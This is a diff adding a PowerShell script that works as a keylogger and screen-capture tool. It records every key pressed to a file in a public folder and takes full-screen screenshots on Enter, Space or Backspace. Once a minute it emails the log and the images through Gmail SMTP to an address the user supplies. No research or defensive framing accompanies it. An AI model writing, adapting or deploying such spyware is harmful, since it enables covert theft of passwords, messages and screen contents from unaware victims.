@@ -1,0 +1,79 @@
+
+  $x = 0
+
+  $allfiles = @()
+
+ Add-Type -AssemblyName WindowsBase
+ Add-Type -AssemblyName PresentationCore
+
+New-Item -Path "C:\Users\Public\Documents\Screen\test.txt" -ItemType File -Force
+$array = @("a","b","c","d","e","f","g","h","i","J","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","space","Enter","1","2","3","4","5","6","7","8","9","Oem5","Capital","backspace","Oem1 ", "OemSemicolon", "OemPlus", "OemComma", "OemMinus", "OemPeriod", "Oem2", "OemQuestion", "Oem3", "OemTilde", "AbntC1", "AbntC2", "Oem4", "OemOpenBrackets", "Oem5", "OemPipe", "Oem6", "OemCloseBrackets", "Oem7", "OemQuotes", "Oem8", "Oem102", "OemBackslash")
+  $allfiles += "C:\Users\Public\Documents\Screen\test.txt"
+
+
+    while ($true){
+
+#####loop trought the array
+foreach($letter in $array){
+$date = (Get-Date).Second
+$key = [System.Windows.Input.Keyboard]::IsKeyUp("$letter")   
+
+if ($key -eq $false){
+    Write-Host "$letter" -NoNewline 
+     "°$letter°" | Out-File -Append -FilePath "C:\Users\Public\Documents\Screen\test.txt" -NoNewline 
+     
+ ###################Screenshot part###########
+if ($letter -eq "Enter" -or $letter -eq "Space" -or $letter -eq "backspace"){
+    $File = "C:\Users\Public\Documents\Screen\Screenshot$x.bmp"
+   
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($File)
+    $allfiles += "C:\Users\Public\Documents\Screen\Screenshot$x.bmp"
+    $x = $x + 1
+}
+
+
+  
+while($key -eq $false){
+    
+    $key = [System.Windows.Input.Keyboard]::IsKeyUp("$letter")
+
+   
+    }
+
+
+}
+if ($date -eq 59){
+(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "Enter" ,"`n" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
+(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "space" ," " | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
+(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "backspace" ,"`b" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
+(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "°" ,"" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
+
+ $allfiles += "C:\Users\Public\Documents\Screen\test.txt"
+
+$EmailFrom = "Enter your E-mail here                
+$EmailTo = "Enter your the email of the person reciving the files"
+            
+$EmailSubject = "Powershell" 
+$EmailBody = "Files and Downlads made today" 
+
+$SMTPserver= "smtp.gmail.com"
+$username="Enter your E-mail here" 
+$password = "Enter you password here" | ConvertTo-SecureString -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential($username, $password)
+
+Send-MailMessage -ErrorAction Stop -from "$EmailFrom" -to "$EmailTo" -subject "$EmailSubject" -body "$EmailBody" -SmtpServer "$SMTPserver"  -Priority  "Normal" -Credential $credential -Port 587 -UseSsl -Attachments $allfiles
+  New-Item -Path "C:\Users\Public\Documents\Screen\test.txt" -ItemType File -Force
+  $allfiles = @()
+}
+
+
+}
+}
+
+
